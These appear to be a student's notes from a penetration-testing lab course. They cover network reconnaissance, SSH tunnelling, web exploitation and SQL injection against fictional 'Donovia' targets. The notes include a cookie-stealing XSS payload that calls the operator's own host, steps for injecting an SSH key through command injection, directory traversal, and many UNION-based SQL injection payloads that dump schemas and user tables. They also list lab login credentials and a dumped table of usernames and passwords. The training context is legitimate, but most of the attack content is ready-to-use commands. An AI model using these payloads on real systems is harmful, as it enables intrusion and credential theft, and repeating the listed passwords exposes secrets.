##Security NOTES

Links: 
https://github.com/nmap/nmap/tree/master/scripts

windows op station ip: 10.50.38.32
linux op station ip: 10.50.21.11

##DAY 1 (Pen Testing)

http://10.50.20.250:8000

Login: 
THHU-505-M X312RSxndiF2sbo  Grey Host: 10.50.35.130

Most common pen testing will start with social networking and getting an inside source for pen testing.

Data Collection:
    Web Data
    Sensitive Data
    Publicly Accessible
    Social Media
    Domain and IP Data

*Ping network then narrow down and nmap the hosts remaining
*ping sweep -> nmap -> banner grab

Script location:

/usr/share/nmap/scripts

Demo Notes:

ssh -MS /tmp/gray student@10.50.35.130 (anything that goes herewill go through your box)

ping sweep command:
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &);done

(on lin-ops) ssh -S /tmp/gray gray -O forward -D 9050
(on lin-ops new tunnel goes through gray host)ssh -S /tmp/gray gray -O forward -L 41900:192.168.28.111:80
ssh -S /tmp/gray gray -O forward -L 41901:192.168.28.111:22

ssh -MS /tmp/comrade comrade@27.0.0.1 -p 41901

proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.111 -p 80

smb discovery

Scheme of Maneuver:
>Jump Box
->Network scan: 192.168.28.96/27
-->Network scan:192.168.150.224/27

Target Section:

Network scans:
Network: 192.168.28.96/27
Network:192.168.150.224/27
OSs: unknown
Creds: student ::
Known Ports: unknown
Known URL: consulting.site.donovia
Known URL: conference.site.donovia
Action: Reconnaissance to collect intelligence and identify possible avenues of approach in the network.

Temp Passes:

houseBeatFliesLOW
YourTempPassword

##DAY 2 Web Exploitation

HTTP Response Codes
    10X == Informational
    2XX == Success
    30X == Redirection
    4XX == Client Error
    5XX == Server Error
https://tools.ietf.org/html/rfc2616

HTTP Fields
    User-Agent
    Referer
    Cookie
    Date
    Server
    Set-Cookie
Demos:
nmap --script http-enum.nse 10.50.45.126 -p80
nikto -host 10.50.45.126

python3 -m http.server
<script>document.location="http://10.50.21.11:8000/"+document.cookie;</script>
<script>alert('hello')</script)

upload web shell to obtain access in the site

directory traversal take all the way back then take it forward (../../../../../../../<command path you want to go to)

checking for command injection consists of testing with a semi colon before a command.

gaining bash access:

ssh-keygen -t rsa -b 4096 (create keys)

(through web injection) echo "public key" > /var/www/.ssh/authorized_keys

ssh -i <id_rsa> www-data@10.50.45.126 (get in using their private key instead of adding your public key)

Master Socket
1. Create Master Socket to Jump / Gray Host
ssh -MS /tmp/gray student@10.50.#.#

1. Cancel Master Socket to Jump / Gray Host
ssh -MS /tmp/gray -O cancel student@10.50.#.#


Port Forward
1. Create Port forward through Master Socket to Next Hop/host
ssh -S /tmp/gray dummy -O forward -L 1330:192.168.28.#:80

1. Cancel Port forward through Master Socket to Next Hop/host
ssh -S /tmp/gray dummy -O cancel -L 1330:192.168.28.#:80 


Dynamic Forwarding
1. Create Port forward through Master Socket to Next Hop/host
ssh -S /tmp/gray dummy -O forward -D9050

1. Cancel Dynamic Tunnell
ssh -S /tmp/gray dummy -O cancel -D9050 (Cancel Dynamic tunnel)


##DAY 3 NOTES SQL INJECTION
Structured Query Language - ANSI Standard
Data bases broken up into tables and store information 

SQL COMMANDS:
    SELECT - Extracts data from a database
    UNION - Used to combine the result-set of two or more SELECT statements
    USE - Selects the DB to use

Demo Sql Web Exploit:
**put semi colon at the end of a command to end it

select * from session.car;
select * from car UNION select tireid,name,size,cost,1,2 from tires (1,2 used to pad out the columns) 
                                                                    such as looking at the individual database and fincing 
                                                                    one has less columns then the other when using UNION 
                                                                    you have to pad out extra columns.
-good practice to change number for each clumn to tell where they went.


SQL queries -
    unsanitized fields can be found using a single quote (')
        will return extraneous information
POST METHOD (sending data to server)
tom' OR 1='1
'tom' OR 1=1;
Looking at inspect source to gain info on crafting sql injection
when ran as php on site add ? to add anything onto it. (?username=tom'OR 1='1 & passwd=tom'OR 1='1) - will spit out passwords

Nesting Statements - 
    php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

union select <column> from <database>.<table> 

table.schema = list of database names 

table_name = list of table names

column_names = list of column names

POST METHOD:

Audi' UNION SELECT 1,2,3,4,5;#
Audi' UNION SELECT 1,2,3,table_schema,table_name from information_schema.tables; # (dumps all tables and their names)

Audi' UNION SELECT 1,2,3,table_schema,table_name from information_schema.columns; #(retrives database names table names and column names.)

Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns WHERE table_schema='session'; # (Retrieves information about the database in use)

Audi' SELECT id,2,name,pass,5 from session.user;# (pull rom the exact columns you want)

#SQL Injection primary methods

GET Method (URL)

<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns
<URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
<URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car

POST Method (Form Input):

Audi' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables #
Audi' UNION SELECT 1,2,3,table_schema,table_name FROM information_schema.tables; #
Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #     -- "Golden" statement
Audi' UNION SELECT 1,2,3,name,size FROM session.Tires; #
Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #

    Change the column name to a different spot, in order to see how you can manipulate the output from the SQL query.

GET METHOD:

php?Selection=2 UNION SELECT table_schema,table_name,3 FROM information_schema.tables;

php?Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.tables;

php?Selection=2 UNION SELECT id,pass,name from session.user;

Scheme of Maneuver:
>Jump Box
->T1:10.100.28.48

Target Section:

T1
Hostname: donovian-nla
IP: 10.100.28.48
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
Last Known HTTP Port: 80
PSP: Unknown
Malware: Unknown
Action: Conduct approved SQLi Exploitation techniques to collect intelligence.


Boss	Sm7KhQHoZ1DGfONxnkyt	3.00
Maverick	turn&burn	3.00
phreak	pwd	3.00
Susan	flowers99	3.00
TW	imAPlaya	3.00
1-2-3-4	sayULuvM3	3.00
rich_kid	1M$	3.00
p0pStar	thrilla	3.00
Joe	vato	3.00
	flag:




















































